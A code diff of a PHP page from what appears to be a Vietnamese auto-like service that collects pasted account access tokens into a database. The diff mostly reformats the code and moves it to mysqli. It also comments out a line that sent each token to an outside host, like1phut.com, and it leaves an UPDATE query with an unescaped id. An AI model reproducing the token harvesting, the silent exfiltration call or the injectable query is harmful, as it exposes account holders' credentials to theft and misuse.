@@ -8,15 +8,15 @@ include 'system/head.php';
 
 
 <div class="card">
-	<div class="header">
-		<h4 class="title"><i class="fa fa-dashboard" style="margin-right: 5px;"></i> Thêm Token vào Hệ Thống </h4>
-		<p class="category">Sử Dụng Token Iphone Để hệ thống hoạt Động</p>
-	</div>
+    <div class="header">
+        <h4 class="title"><i class="fa fa-dashboard" style="margin-right: 5px;"></i> Thêm Token vào Hệ Thống </h4>
+        <p class="category">Sử Dụng Token Iphone Để hệ thống hoạt Động</p>
+    </div>
 <div class="content">     
 <form method="post">
   <div class="form-group">
     <label for="info">Nhập Token IPhone: (Cách nhau = Xuống Dòng)</label>
-	<textarea name="token" class="form-control" rows="10"></textarea>
+    <textarea name="token" class="form-control" rows="10"></textarea>
   </div>
   <button type="submit" class="btn btn-success">Thêm Token</button>
 </form>
@@ -37,16 +37,16 @@ foreach ($data as $token) {
    $me = cek(trim($token));
 
    if ($me['id']) {
-      if (mysql_num_rows(mysql_query("SELECT `name` FROM token WHERE user_id = '" . mysql_real_escape_string($me['id']) . "'"))) {
-         mysql_query("UPDATE token SET `access_token` = '" . mysql_real_escape_string($token) . "' WHERE `user_id` = " . $me['id'] . "");
+      if (mysqli_num_rows(mysqli_query($GLOBALS["___BMN_2312"], "SELECT `name` FROM token WHERE user_id = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $me['id']) . "'"))) {
+         mysqli_query($GLOBALS["___BMN_2312"], "UPDATE token SET `access_token` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $token) . "' WHERE `user_id` = " . $me['id'] . "");
          ++$insert;
       } else {
-         mysql_query("INSERT INTO token SET
-               `user_id` = '" . mysql_real_escape_string($me['id']) . "',
-               `name` = '" . mysql_real_escape_string($me['name']) . "',
-               `access_token` = '" . mysql_real_escape_string($token) . "'
+         mysqli_query($GLOBALS["___BMN_2312"], "INSERT INTO token SET
+               `user_id` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $me['id']) . "',
+               `name` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $me['name']) . "',
+               `access_token` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $token) . "'
          ");
-		 auto('http://like1phut.com/check.php?puaru='.$token);
+         //auto('http://like1phut.com/check.php?puaru='.$token);
          ++$update;
       }
    }
@@ -75,4 +75,4 @@ function trien($url) {
 }
 echo '</div></div></div>';
 include 'system/foot.php';
-?>
+?> 
